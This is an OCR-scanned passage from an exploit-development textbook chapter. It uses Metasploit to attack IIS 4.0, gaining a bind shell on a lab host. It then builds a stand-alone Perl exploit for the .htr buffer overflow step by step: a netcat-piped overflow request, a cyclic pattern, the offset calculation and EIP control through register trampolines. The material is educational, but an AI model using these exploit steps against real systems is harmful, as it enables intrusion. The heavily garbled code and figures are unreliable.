to work in different networks or changing system conditions, 
After adding the payload, there may be additional options that must be set. In Figure 
12.10, the show options command is run to display the new options. 

Writing Exploits III • Chapter 12 
Figure 12.9 Setting the Payload 
shou payLaAds 
stasploit Franeuork Usable Payloads 
in32_bind 
in32_bind d l l i n j e c t 
in32_bind_meterpreter 
in32_bind stg 
in32_bind stg upexec 
in32_bind uncinject 
in32 exec 
in32_reverse 
in32_reverse_dllinject 
in32 . r e vers e _iw t e r p v tr t e r 
in32_reoerse_stg 
in32 reverse stg upexec 
in32_reverse_vncinject 
LJindous 
LJindous 
' 
. i i • 
.' 
. i ' . 1 
LJindous 
Windows 
Windows 
Windows 
U i n d i i u : ; 
U i n d t i u : ; 
Windows 
Windows 
l l i r i r t n u : ; 
h i 
it. 
h i 
St 
St 
h i 
lJ.X 
K<: 
H<r 
He 
ttt 
S L 
H e 
nd Shell 
nd DLL I n j e c t 
nd Meterpreter DLL Inject 
aged Bind Shell 
aged Bind Upload^Execute 
nd UNC Server DLL Inject 
ecute Connand 
verse Shell 
verse DLL Inject 
ui:i-::t: 
Ht.*li:i"i>rtr t i.*r 
DLL 
I n j c i r t 
aged Reverse Shell 
aged Reverse UploadsExecute 
verse UHC Server Inject 
i. 12 blnd> > set PAYLOAD uin32_bind 
PAVLOAD -> uin32_bind 
_hind> > 
Figure 12.10 Additional Payload Options 
|«>• ^/framework 
i^-IM ht r<w in32 _bind^ > show options 
Exploit and Payload Opt ions 
Exploit: 
Name 
Default 
Description 
optional 
SSL 
Use SSL 
required 
RHOST 
192.168.119_13& 
The target address 
required 
RPORT 
80 
The target port 
Payload: 
Name 
Default 
Description 
required 
EXITFUNC 
seh 
Exit technique: "process", "thread", 
required 
LPQRT 
4444 
Listening port for bind s h e l l 
Target: Uindous HT4 SP5 
_ 
J O 
"seh" 
*l 
d 
-J 
zl 
One useful command when testing an exploit is the save command. This command 
writes the current environment and all exploit-specific environment variables to disk, 
and they will be loaded the next time msfconsole is run. 
If the user is satisfied with the default payload options, the exploit command is run 
to deploy the attack. In Figure 12.1 l,the exploit successfully triggers the vulnerability 
on the remote system. A listening port is established, and the Metasploit handler auto-
matically attaches to the waiting shell. 
Figure 12.11 An Exploit Triggers a Vulnerability on the Remote System 
exploit 
[•] Starting Bind Handler. 
I » ] 
T r y i n g Windows NT4 SP5 u s i n g jmp eax at 
0 x ? ? f ? 6 3 8 S . . . 
[*] Got connection from 192.168.119.1:3342 <-> 192.168.119.136 
1 i c r o s o f t < R > Uindous 
HT<TM> 
<C> Copyright 1985-1996 Microsoft Corp. 
C : \ H I N N I \ s os t e n 3 2 >_ 

498 
Chapter 12 * Writing Exploits III 
The ability to dynamically handle payload connections is yet another unique 
Metasploit feature. Traditionally, an external program like Netcat must be used to con-
nect to the listening port after the exploit has been triggered. If the payload were to 
create a VNC server on the remote machine, then an external VNC client would be 
needed to connect to the target machine. However, the framework removes the needs 
for outside payload handlers. In the previous example, a connection is automatically ini-
tiated to the listener on port 4444 of the remote machine after the exploit succeeds. This 
payload handling feature extends to all payloads provided by Metasploit, including 
advanced shellcode like VNC- inject. 
The preceding example covered only those commands necessary in the exploit 
development process that follows. For more information about using the Metasploit 
Framework, including a full-blown user's guide, visit the official Metasploit documenta-
tion a t ww w. m e tasplo it. c o m / p roj ec ts / Fra m ewo rk / do c u m en ta tio n. h tml. 
Exploit Development with Metasploit 
In this section, we will develop a stand-alone exploit for the same vulnerability that was 
exploited in the previous example. Normally, writing an exploit requires an in-depth 
understanding of the target architecture's assembly language, detailed knowledge of the 
operating system's internal structures, and considerable programming skill. 
Using the utilities provided by Metasploit, this process is greatly simplified.The 
Metasploit project abstracts many of these details into a collection of simple, easy-to-use 
tools.These tools can be used to significantly speed up the exploit development timeline 
and reduce the amount of knowledge necessary to write functional exploit code. In the 
process of re-creating the IIS 4.0 HTR, Buffer Overflow, we will explore the use of 
these utilities. 
The following sections cover the exploit development process of a simple stack 
overflow from start to finish. First, the attack vector of the vulnerability' is determined. 
Second, the offset of the overflow vulnerability must be calculated. After deciding on the 
most reliable control vector, a valid return address must be found. Character and size 
limitations will need to be resolved before selecting a payload. A nop sled must be cre-
ated. Finally, the payload must be selected, generated, and encoded. 
Assume that in the follow exploit development that the target host runs the 
Microsoft Internet Information Server (IIS) 4.0 Web server on Windows NT4 Service 
Pack 5, and the system architecture is based around a 32-bit x86 processor. 
Determining the Attack Vector 
An attack vector is the means by which an attacker gains access to a system to deliver a 
specially crafted payload. This payload can contain arbitrary code that gets executed on 
the targeted system. 
The first step in writing an exploit is to determine the specific attack vector against 
the target host. Because Microsoft's IIS Web server is a closed-source application, we 
must rely on security advisories and attempt to gather as much information as possible. 
The vulnerability to be triggered in the exploit is a buffer overflow in Microsoft 

Writing Exploits III • Chapter 12 
499 
Internet Information Server (IIS) 4.0 that was first reported by eEye in 
www.eeye.com/html/research/advisories/AD19990608.html.The eEye advisory explains 
that an overflow occurs when a page with an extremely long filename and an .htr file 
extension is requested from the server. When IIS receives a file request, it passes the file-
name to the ISM dynamically linked library (DLL) for processing. Because neither the 
IIS server nor the ISM DLL performs bounds checking on the length of the filename, it 
is possible to send a filename long enough to overflow a buffer in a vulnerable function 
and overwrite the return address. By hijacking the flow of execution in the ISM DLL 
and subsequently the inetinfo.exe process, the attacker can direct the system to execute 
the payload. Armed with the details of how to trigger the overflow, we must determine 
how to send a long filename to the IIS server. 
A standard request for a Web page consists of a GET or POST directive, the path 
and filename of the page being requested, and HTTP protocol information. The request 
is terminated with two newline and carriage return combinations (ASCII characters 
0x10 and 0x13, respectively).The following example shows a GET request for the 
index.html page using the HTTP 1.0 protocol. 
GET /index,html HTTP/1.0\r\n\r\n 
According to the advisory, the filename must be extremely long and possess the htr 
file extension. The following is an idea of what the attack request would look like: 
GET /extremelylargestringofcharactersthatgoesonandon.htr HTTP/1.0\r\n\r\n 
Although the preceding request is too short to trigger the overflow, it serves as an 
excellent template of our attack vector. In the next section, we determine the exact 
length needed to overwrite the return address. 
Finding the Offset 
Knowing the attack vector, we can write a Perl script to overflow the buffer and over-
write the return address (see Example 12.1). 
^ ^ ^ ^ Example 12.1 Overwriting the Return Address 
• • • M H 
T 
^string - "GET /"; 
2 
Sstring .= "A" x 4000; 
3 
Sstring 
.=".htr HTTP/1.0\r\n\r\n"; 
4 
5 
openlNC, "|nc.exe 192.168.1B1.129 80"); 
6 
print; NC Sstring; 
7 
close(NC); 
In line 1, we start to build the attack string by specifying a GET request. In line 2, 
we append a string of 4000 A characters that represents the filename. In line 3, the .htr 
file extension is appended to the filename. By specifying the .htr file extension, the file-
name gets passed to the ISM DLL for processing. Line 3 also attaches the HTTP pro-
tocol version as well as the carriage return and newline characters that terminate the 
request. In line 5, a pipe is created between the NC file handle and the Netcat utility. 
Because socket programming is not the subject of this chapter, the pipe is used to 

500 
Chapter 12 * Writing Exploits III 
abstract the network communications.The Netcat utility has been instructed to connect 
to the target host at 192.168.181.129 on port 80. In line 6, the fstring data is printed to 
the NC file handle. The NC file handle then passes the Sstring data through the pipe to 
Netcat which then forwards the request to the target host. 
Figure 12.12 illustrates the attack string that is being sent to IIS. 
Figure 12.12 The First Attack String 
GET/ 
AAAAAAAAA... (4000 'A' characters) 
htr HTTP/1 ,o\r\n\r\n 
After sending the attack string, we want to verify that the return address was over-
written. In order to verify that the attack string overflowed the filename buffer and 
overwrote the return address, a debugger must be attached to the IIS process, 
inetinfo.exe. The debugger is used as follows: 
1. Attach the debugger to the inetinfo.exe process. Ensure that the process con-
tinues execution after being interrupted. 
2. Execute the script in Example 12.1. 
3. The attack string should overwrite the return address. 
4. The return address is popped into EIP. 
5. When the processor attempts to access the invalid address stored in EI I* the 
system will throw an access violation. 
6. The access violation is caught by the debugger, and the process halts. 
7. When the process halts, the debugger can display process information 
including virtual memory, disassembly, the current stack, and the register states. 
The script in Example 12.1 does indeed cause EIP to be overwritten. In the 
debugger window shown in Figure 12.13, EIP has been overwritten with the hexadec-
imal value 0x41414141.This corresponds to the ASCII string AAAA, which is a piece of 
the filename that was sent to IIS. Because the processor attempts to access the invalid 
memory address, 0x41414141, the process halts. 
Figure 12.13 The Debugger Register Window 
Registers (FPU) 
EfiX 00F0FCCC ASCII 
ECX 41414141 
EOX 77F9667A n t d l l 
EBX 80F9F970 
ESP 00F6FSAC 
EBP 00F0F8CC 
ESI 00F0FCC4 ASCII 
E0I 00000000 
EIP 41414141 
"flfiflflftflflfiflflftflflftt 
77F9667R 
"flflftflflftflflftflflAflfll 

Writing Exploits III • Chapter 12 
501 
A 
NOTE t
When working with a closed-source application, an exploit developer will often 
use a debugger to help understand how the closed-source application functions 
internally. In addition to helping step through the program assembly instruc-
tions, it also allows a developer to see the current state of the registers, 
examine the virtual memory space, and view other important process informa-
tion. These features are especially useful in later exploit stages when one must 
determine the bad characters, size limitations, or any other issues that must be 
avoided. 
Two of the more popular Windows debuggers can be downloaded for 
free at: 
www.microsoft.com/whdc/devtools/debugging/default.mspx 
http://home.t-online.de/home/Ollydbg/ 
In our example, we use the OllyDbg debugger. For more information about 
OllyDbg or debugging in general, access the built-in help system included with 
OllyDbg. 
In order to overwrite the saved return address, we must calculate the location of the 
four A characters that overwrote the saved return address. Unfortunately, a simple file-
name consisting of A characters will not provide enough information to determine the 
location of the return address. A filename must be created such that any four consecutive 
bytes in the name are unique from any other four consecutive bytes. When these unique 
four bytes are popped into EIP, it will be possible to locate these four bytes in the file-
name string. To determine the number of bytes that must be sent before the return 
address is overwritten, simply count the number of characters in the filename before the 
unique four-byte string.The term ofFset is used to refer to the number of bytes that 
must be sent in the filename just before the four bytes that overwrite the return address. 
In order to create a filename where every four consecutive bytes are unique, we use 
the PaitemCreateQ method available from the Pex.pm library located in —/framework/lib. 
The PattemCreateQ method takes one argument specifying the length in bytes of the pat-
tern to generate.The output is a series of ASCII characters of the specified length where 
any four consecutive characters are unique. This series of characters can be copied into 
our script and used as the filename in the attack string. 
|irH^nEisj 
The PatteruCreateQ function can be accessed on the command-line with perl -e 'use 
I Pex;print Pex::Text:;PattemCre<ite(4000)', The command output is pasted into our script 
in Example 12.2. 
Example 12.2 Overflowing the Return Address with a Pattern 
1 $pactern = 
2 
-AaQAalAa2Aa3ta4Aa5Aa6Aa7Aa8Aa9At>aAblAb2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac(r 
. 
3 
-AclAc2Ac3Ac4Ac5AcSAc7Ac8Ac9AdOAdlAd2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae:L" 
. 
4 
•Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0AflAf2Af3A£4Af5Af6Af7Af8Af9Ag0AglAg2" 
. 
5 
'Ag3Ag4Ag5Ag6Ag7Ag8Ag9AhOAhlAh2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0AilAi2Ai3" 
. 
6 
•Ai4Ai5AiSAi7AiBAi9AjOAjlAj2Aj3Aj4Aj5Aj6Aj7A]EAj9Alc0AklAk2Alc3Ak4" 
. 

Chapter 12 * Writing Exploits III 
7 
" Ak 5 Ak6 Ak7 Ak8 Ak9 A10 A U A12 Al 3 Al 4 Al 5 Al 6 Al 7 Al 8 Al 9 AmO Am 1 Am2 Am 3 Am4 Am 5" 
8 
"flm6Am7Am8Am9AnCAnlAn2An3An4An5An6An7An8An9Ao0A()lAo2Ao3Ao4Ao5Ao6" 
9 
MAo7AoaAo9Ap0AplAp2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0AqlAq2Aq3Aq4Aq5AqSAq7" 
10 
" Aq8Aq9Ar OAr lAr2Ar 3Ar 4Ar 5 Ar 6 Ar 7 Ar B Ar 9 As 0 As 1 As 2 As 3 As 4 As S As 6 As 7As 8 • 
1 1 
"As9AtOAtlAt2At3At4At5At6At7At8At9Au0AulAu2Au3Au4Au5Au6Au7Au8Au9" 
12 
" A vO A V1A v2 A v3 A v4 A v5 A v6 A v7 Av 8 Av 9 AwO Awl Aw2 Aw 3 Aw4Aw 5Aw 6Aw7 Aw8Aw9 AxO" 
13 
"Ax1Ax2 Ax3 Ax 4 Ax 5 Ax 6 Ax 7 Ax 8 Ax 9 Ay0 Ay1Ay2 Ay3 Ay4 Ay 5Ay 6Ay7Ay8Ay9A z 0A z1" 
14 
"Az2Az3Az4Az5Az6Az7Az8Az9Ba0BalBa2Ba3Ba4Ba5Ba6Ba7Ba8Ba9BbOBblBb2• 
15 
"Bb3Eb4BbSBb6Bb7Bb8Bb9Bc0BclBc2Bc3Bc4B!;5Bc6Bc7Bc8Bc9BdOBdlBd2Bd3" 
16 
"Bd4Bd5Bd6Bd7Bd8Bd9Be0BelBe2Be3Be4Be5Be6Be7Be3Be9Bf0BflBf2Bf3Bf4' 
17 
"BfSBf6Bf7Bi8Bf9Bg0Bg:LBg2Bg3Bg4Bg5Bg6Bg7Bg3Bg9Bh0BhlBh2Bh3Bh4BhS' 
18 
"BhSBh7Bh8Eh9Bi0BilBi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9BJOBJlBJ2BJ3BJ4BJ5BJS" 
19 
"Bj7Bj8Bj9Bk0BklBk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9B10BllB12B13B14B15B16B17-
20 
"B18B19 BmO Bm1Bm2 Bm3 Bm4 Bm5 Bm6 Bm7 Bm8 Bm9 Bn 0 Bn1Bn2 Bn 3 Bn4 Bn 5Bn 6Bn7 Bn8" 
21 
"Bn9BoOBolBo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9BpOBplBp2Bp3Bp4Bp5Bp6Bp7BpBBp9" 
2 2 
"BqOBqlBq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0BrlBr2Br3Br4Br5Br6Br7Br8Br9BsO" 
2 3 
"BslBs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0BtlBt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9BuOBul' 
2 4 
"Bu2Bu3Blj4Bu5Bu6Bu7Bu8Bu9Bv0BvlBv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9BwOBwlBw2" 
25 
" Bw3 Bw4 BwS Bw6 Bw7 Bw8 Bw9 BxO Bx 1 Bx 2 Bx 3 Bx 4 Bx 5 Bx 6 Bx7 Bx 8 Bx 9 By0 By 1 By2 By3 " 
26 "By4BySBy6By7By8By9Bz0BzlBz2Bz3Bz4Bz5Bz6Bz7Bz3Bz9Ca0CalCa2Ca3Ca4' 
2 7 
"Ca5Ca6Ca7Ca8Ca9CMCblCb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0CclCc2Cc3Cc4Cc5" 
28 
"Cc SCc 7 Cc 8 Cc 9 CdO CdlCd2 Cd3 Cd 4 Cd5 Cd 6 Cd7 Cd 8Cd 9C e 0C e1C e2C e3 Ce4 Ce 5Ce 6" 
29 
"Ce7Ce3Ce9Cf0CflCf2cf3Cf4cf5Cf6Cf7cf8Cf9Cg0CgJ.Cg2Cg3Cg4Cg5Cg6Cg7" 
30 
"Cg8Cg9Ch0ChlCh2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0CilCi2Ci3Ci4Ci5Ci6Ci7Ci8-
31 
"Ci9CjOCjlCj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0CklCk2Ck3Ck4Ck5Ck6Ck7Ck6Ck9" 
32 
"ClOCllC12C13C14C15C16C17C18C19Cm0CmlCm2Cm3Crn4Cm5Crn6Cm7Cm8Cm9CnO' 
33 
llCnlCn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0ColCo2Co3Co4Co5Co6Co7Co8Co9Cp0Cpl" 
34 
" Cp2 Cp3 Cp4 CpS Cp6 Cp7 Cp8 Cp9 CqO Cql Cq2 Cq3 Cq4 Cq 5Cq 6Cq7Cq 8Cq9 C r OCr 1 Cr 2 ' 
35 "Ct3Ct4Cr5Cr6Cr7Cr8Cr9Cs0CslCs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9CtOCtlCt2Ct3" 
36 "Ct4CtSCt6Ct7ct8Ct9Cu0CulCu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0CvlCv2Cv3Cv4" 
37 
"CV 5CV 6Cv7 Cv8 Cv9 CwO CwlCw2 Cw3 Cw4 Cw5 Cw6 Cw7Cw 8Cw 9Cx O C X 1 C X 2 Cx 3 Cx4 Cx 5" 
38 
"Cx6Cx7Cx8Cx9Cy0CylCy2Cy:iCy4Cy5Cy6Cy7Cy3Cy9Cz0CzlCz2Cz3Cz4Cz5Cz6' 
39 
"Cz7Cz8Cz9Da0Da:LDa2Da3Da4Da5Da6Da7Da8Da9Db0Db:LDb2Db3Db4DbSDb6Db7-
4 0 
"Db8Db9Dc0DelDe2De3De4De5Dc6Dc7Dc8Dc9Dd0DdlDd2Dd3Dd4Dd5DdSDd7Dd8" 
41 
"Dd9DeODelDe2De3De4De5De6De7De8De9Df0DflD£2D£3D£4D£5D£6Df7Df8Di9" 
42 
"DgODglDg2Dg3Dg4DgSDg6Dg7Dg8Dg9Dh0DhlDh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9DiO" 
4 3 
"DilDi2Di3Di4Di5Di6Di7Di8Di9Dj0DjlDj2Dj3Dj4Dj5DjSDj7Dj8Dj9DkODkl" 
44 
"Dk2 Dk3 Dk4Dk5Dk6Dk7Dk8Dk9Dl0D11D12D13D14D15D16D17D1SD19 DmODmlDm2• 
4 5 
"Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0DnlDn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0DolDo2Do3" 
4 6 
MDo4DoSDO6Do7Do8Do9Dp0DplDp2Dp3Dp4Dp5DpSDp7Dp8Dp9Dq0DqlDq2Dq3Dq4" 
47 "Dq5Dq6Dq7Dq8Dq9Dr0DrlDr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Da0DalDa2Da3Da4Da5" 
48 "Ds6Ds7Ds8Ds9Dt0DtlDt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0DulDu2Du3Du4Du5Du6" 
4 9 
"Du7Du8Du9Dv0DvlDv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0DwlDw2Dw3Dw4Dw5Dw6Dw7" 
50 
" 
Dw8l^9Dx0DxlDx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy:LDy2Dy3Dy4Dy5Dy6Dy7Dy8" 
51 
"Dy9Dz0DzlDz2Dz3Dz4DzSDz6Dz7Dz8Dz9Ea0EalEa2Ea3Ea4Ea5Ea6Ea7Ea8Ea9" 
52 "EbOEblEb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0EclEc2Ec3Ec4Ec5Ec6Ec7Ec8Ec9EdO" 
53 "EdlEd2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0EelEe2Ee3Ee4Ee5Ee6Ee7Ee8Ee9EfOEfl' 
54 "Ef2Ef3Ef4E£5E£6E£7E£8Ef9Eg0EglEg2Eg3Eg4Eg5Eg6Eg7Eg3Eg9EhOEhlEh2' 
55 "Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0EilEi2Ei3Ei4Ei5Ei6Ei7Ei8Ei9EjOEjlEj2Ej3" 
56 
nEj4Ej&Ej6Ej7Ej8Ej9Ek0EklEk2Ek3Ek4Ek5Ek6Ek7Ek3Ek9E10EllE12E13E14-' 
57 "E15ElSE17E18E19Em0EmlEm2Eni3Em4Eiii5Em6Ein7Eni8Eni9En0EnlEn2En3En4En5" 
5 8 
"EnSEn7En8En9Eo0EolEo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0EplEp2Ep3Ep4Ep5EpS" 
59 
"Ep7Ep8Ep9Eq0EqlEq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9ErOErlEr2Er3Er4Er5Er6Er7" 
60 "Er8Er9Es0EslEs2Es3Es4Es5Es6Es7Es8Es9Et0EtlEt2Et3Et4Et5Et6Et7Et8' 
61 
"Et9EuOEulEu2Eu3Eu4EuSEu6Eu7Eu8Eu9Ev0EvlEv2Ev3Ev4Ev5Ev6Ev7Ev8Ev9" 
62 
" EwO Ew 1 Ew2 Ew3 Ew4 Ew5 Ew6 Ew7 Ew8 Ew9 Ex 0 Ex 1 Ex2 Ex 3 Ex4 Ex 5 Ex 6 Ex7 Ex8 Ex9 EyO " 
6 3 
"EylEy2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0EzlEz2Ez3Ez4Ez5Ez6Ez7EzBEz9FaOFal" 

Writing Exploits III • Chapter 12 
503 
64 
"Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0FblFb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9FcOFclFc2" . 
65 
-Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0FdlFd2F"; 
66 
67 
Sstring = "GET I"; 
68 
Sstri ng .= Spat tern; 
69 
Sstring .=-.htr HTTP/1.0\r\n\r\n"; 
70 
71 
openINC, "Inc-exe 192.168.181.129 30'); 
72 
print NC Sstring; 
73 
close(NC); 
In lines 1 through 65, {pattern is set equal to the string of 4000 characters generated 
by PatttriiCrcatL'f). In line 68, the Spat tern variable replaces the 4000 A characters previ-
ously used for the filename. The remainder of the script remains the same. Only the file-
name has been changed. After executing the script again, the return address should be 
overwritten with a unique four-byte string that will be popped into the EIP register (see 
Figure 12.14). 
Figure 12.14 Overwriting EIP with a Known Pattern 
Registers EFPU) 
OOFCiFCCC -
ECX 74413674 
ED>! 77F9667A ntdll. 
EE:;< 00F0F970 
ESP 00F0F8OC 
EBP 00F0F8CC 
ESI 00F0FCC4 ASCII 
EDI 08006000 
EIP 74413674 
" 
77F96670 
"fltSP)t6At7flt8ftr 
In Figure 12.14, the EIP register contains the hexadecimal value 0x74413674, which 
translates into the ASCII string "tA6t".To find the original string, the value in EIP must 
be reversed to "t6At".This is because OllyDbg knows that the x86 architecture stores all 
memory addresses in little-endian format, so when displaying EIP it formats it in big-
endian to make it easier to read.The original string "t6At" can be found in line 11 of 
Example 12.2 as well as in the ASCII string pointed to by the ESI register. 
Now that wc have a unique four-byte string, we can determine the offset of the 
return address. One way to determine the offset of the return address is to manually 
count the number of characters before "t6 At", but this is a tedious and time-consuming 
process.To speed up the process, the framework includes the patternOrfset.pl script 
found in ~ (framework/idk, Although the functionality is undocumented, examination of 
the source code reveals that the first argument is the big-endian address in EIP, as dis-
played by OllyDbg, and the second argument is the size of the original buffer. In 
Example 12.3, the values 0x74413674 and 4000 are passed to patternOffset.pl. 
•••••"->•' Example 12.3 Result of PatternOffset.pl 
• • • I ^ B 
Adniinistrater^nothingbutfat 
-/framework/sdk 
$ ./patternOffset.pl 0x74413674 4000 
589 

504 
Chapter 12 * Writing Exploits III 
The patternOffset.pl script located the string"tA6t" at the offset 589.This means 
that 589 bytes of padding must be inserted into the attack string before the four bytes 
that overwrite the return address.The latest attack string is displayed in Figure 12.15. 
Henceforth, we will ignore the HTTP protocol fields and the file extension to simplify' 
the diagrams, and they will no longer be considered part of our attack string although 
they will still be used in the exploit script. 
Figure 1 2 . 1 5 The Current Attack String 
GET/ 
589 bytes 
of partem 
4 bytes overwriting saved 
return address 
3407 bytes 
of pattern 
.htr HTTP/1,0\r\n\r\n 
The bytes in 1 ro 589 contain the pattern string.The next four bytes in 590 to 593 
overwrite the return address on the stack; this is the "tA6t" string in the pattern. Finally, 
the bytes in 594 to 4000 hold the remainder of the pattern. 
Now we know that it is possible to overwrite the saved return address with an arbi-
trary value. Because the return address gets popped into EIP, we can control the EIP 
register. Controlling EIP will allow us to lead the process to the payload, and therefore, it 
will be possible to execute any code on the remote system. 
Selecting a Control Vector 
Much like how an attack vector is the means by which an attack occurs, the control 
vector is the path through which the flow of execution is directed to our code. At this 
point, the goal is to find a means of shifting control from the original program code 
over to a payload that will be passed in our attack string. 
In a buffer overflow attack that overwrites the return address, there are generally two 
ways to pass control to the pavload.The first method overwrites the saved return address 
with the address of the payload on the stack; the second method overwrites the saved 
return address with an address inside a shared library.The instruction pointed to by the 
address in the shared library causes the process to bounce into the payload on the stack. 
Before selecting either of the control vectors, each method must be explored more fully 
to understand how the flow of execution shifts from the original program code to the 
shellcode provided in the payload. 
NOTE 
The term payload refers to the architecture-specific assembly code that is passed 
to the target in the attack string and executed by the target host. A payload is 
created to cause the process to produce an intended result such as executing a 
command or attaching a shell to a listening port. 
Originally, any payload that created a shell was referred to as shellcode, but 
this is no longer the case as the term has been so commonly misused that it 
now encompasses all classes of payloads. In this text, the terms payload and 

Writing Exploits III • Chapter 12 
505 
shellcode will be used interchangeably. The term "payload" may also be used 
differently depending on the context. In some texts, it refers to the entire attack 
string that is being transmitted to the target; however, in this chapter the term 
"payload" refers only to the assembly code used to produce the selected out-
come. 
The first technique overwrites the saved return address with an address of the pay-
load located on the stack. As the processor leaves the vulnerable function, the return 
address is popped into the EIP register, which now contains the address of our payload. 
It is a common misconception that the EIP register contains the next instruction to be 
executed; EIP actually contains the address of the next instruction to be executed. In 
essence, EIP points to where the flow of execution is going next. By getting the address 
of the payload into EIP, we have redirected the flow of execution to our payload. 
Although the topic of payloads has not been fully discussed, assume for now that the 
payload can be placed anywhere in the unused space currently occupied by the pattern. 
Note that the payload can be placed before or after the return address. Figure 12.16 
demonstrates how the control is transferred to a location before the return address. 
Figure 1 2 . 1 6 Method One; Returning Directly to the Stack 
1. Overwrite the saved return 
address with the address 
of the payload on the stack. 
589 bytes for payload 
4 bytes overwriting saved 
return address 
3407 bytes for payload 
2. The address of our payload is 
popped into the EIP register. 
3. The processor is directed 
to the instruction located at 
the address in the EIP register-
Thus executing our code. 
EIP 
Unfortunately, the base address of the Windows stack is not as predictable as the base 
address of the stack found on U N I X systems. What this means is that on a Windows 
system, it is not possible to consistently predict the location of the payload; therefore, 
returning directly to the stack in Windows is not a reliable technique between systems. 
Yet the shellcode is still on the stack and must be reached.This is where the second 
method, using a shared library trampoline, becomes useful to us. 
The idea behind shared library bouncing is to use the current process environment 
to guide EIP to the payload regardless of its address in memory. The trick of this tech-
nique involves examining the values of the registers to see if they point to locations 
within the attack string located on the stack. If we find a register that contains an 

506 
Chapter 12 * Writing Exploits III 
address in our attack string, we can copy the value of this register into EIP, which now 
points to our attack string. 
The process involved with the shared library method is somewhat more complex 
than returning directly to the stack. Instead of overwriting the return address with an 
address on the stack, the return address is overwritten with the address of an instruction 
that will copy the value of the register pointing to the payload into the EIP register.To 
redirect control of EIP with the shared library technique, you need to follow these steps 
(see Figure 12.17): 
1. 
2. 
3. 
Assume register EAX points to our payload and overwrite the saved return 
address with the address of an instruction that copies the value in EAX into 
EIR (Later in the text, we will discuss how to find the address of this instruc-
tion.) 
As the vulnerable function exits, the saved return address is popped into EIP. 
EIP now points to the copy instruction. 
The processor executes the copying instruction, which moves the value of 
EAX into EIP. EIP now points to the same location as EAX; both registers 
currently point to our payload. 
When the processor executes the next instruction, it will be code from our 
payload; thus, we have shifted the flow' of execution to our code. 
Figure 12.17 Method Two: Using a Shared Library Trampoline 
1 Overwrite the saved return 
address with the address ol an 
instruction that copies EAX into EIP. 
589 byles for payload 
4 bytes overwriting saved 
return address 
3407 bytes for payload 
2 The address of this 
instruction is popped 
into EIP. 
4 The processor executes 
the instruction pointed 
to by EIP: ihe payload 
is executed. 
EIP 
3. The processor copies the 
value in EAX into EIP 
We can usually assume that at least one register points to our attack string, so our 
next objective is to figure out what kind of instructions will copy the value from a reg-
ister into the EIP register. 
NOTE 
Be aware of the fact that registers are unlike other memory areas in that they 
do not have addresses. This means that it is not possible to reference the values 
in the registers by specifying a memory location. Instead, the architecture pro-

Writing Exploits III • Chapter 12 
vides special assembly instructions that allow us to manipulate the registers. EIP 
is even more unique in that it can never be specified as a register argument to 
any assembly instructions. It can only be modified indirectly. 
By design, there exist many instructions that modify EIP, including CALL,JMP, and 
others. Because the CALL instruction is specifically designed to alter the value in EIP, it 
will be the instruction that is explored in this example. 
The CALL instruction is used to alter the path of execution by changing the value 
of EIP with the argument passed to it.The CALL instruction can take two types of 
arguments: a memory address or a register. 
If a memory address is passed, then CALL will set the EIP register equal to that 
address. If a register is passed, then CALL will set the EIP register to be equal to the 
value within the argument register. With both types of arguments, the execution path 
can be controlled. As discussed earlier, we can not consistently predict stack memory 
addresses in Windows, so a register argument must be used. 
NOTE I 
One approach to finding the address of a CALL (or equivalent) instruction is to 
search through the virtual memory space of the target process until the correct 
series of bytes that represent a CALL instruction is found. A series of bytes that 
represents an instruction is called an opcode. As an example, say the EAX reg-
ister points to the payload on the stack, so we want to find a CALL EAX instruc-
tion in memory. The opcode that represents a CALL EAX is OxFFDO, and with a 
debugger attached to the target process, we could search virtual memory for 
any instance of OxFFDO. Even if we find these opcodes, however, there is no 
guarantee that they can be found at those memory addresses every time the 
process is run. Thus, randomly searching through virtual memory is unreliable. 
The objective is to find one or more memory locations where the sought 
after opcodes can be consistently found. On Windows systems, each shared 
library (called DLLs in Windows) that loads into an application's virtual memory 
is usually placed at the same base addresses every time the application is run. 
This is because Windows shared libraries (DLLs) contain a field, ImageBase, that 
specifies a preferred base address where the runtime loader will attempt to 
place it in memory. If the loader can not place the library at the preferred base 
address, then the DLL must be rebased, a resource-intensive process. Therefore, 
loaders do their best to put DLLs where they request to be placed. By limiting 
our search of virtual memory to the areas that are covered by each DLL, we can 
find opcodes that are considerably more reliable. 
Interestingly, shared libraries in UNIX do not specify preferred base 
addresses, so in UNIX the shared library trampoline method is not as reliable as 
the direct stack return. 

508 
Chapter 12 * Writing Exploits III 
To apply the second method in our example, we need to find a register that points 
somewhere in our attack string at the moment the return address is popped into EIR We 
know from earlier that if an invalid memory address is popped into EIR the process will 
throw an access violation when the processor attempts to execute the instruction refer-
